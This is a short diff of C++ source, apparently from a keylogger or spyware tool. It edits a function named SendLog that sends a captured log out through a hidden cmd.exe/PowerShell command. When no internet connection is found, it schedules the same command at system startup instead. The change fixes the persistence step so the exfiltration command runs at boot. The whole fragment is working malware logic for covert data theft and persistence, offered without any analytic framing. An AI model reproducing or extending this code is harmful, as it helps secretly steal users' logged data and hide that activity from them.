@@ -1006,7 +1006,7 @@ void SendLog(std::string CurrentLog) {
     Command += Powershell;
     if (!InternetGetConnectedState(&DWFlags, NULL)) {
         LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
-        RegisterMyProgramForStartup(PSStartup.c_str(), Powershell.c_str(), "");
+        RegisterMyProgramForStartup(PSStartup.c_str(), "C:\\Windows\\System32\\cmd.exe", Command.c_str());
     }else{
         LogItChar("Connected to the internet, sending the log...", CurrentLog);
         ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
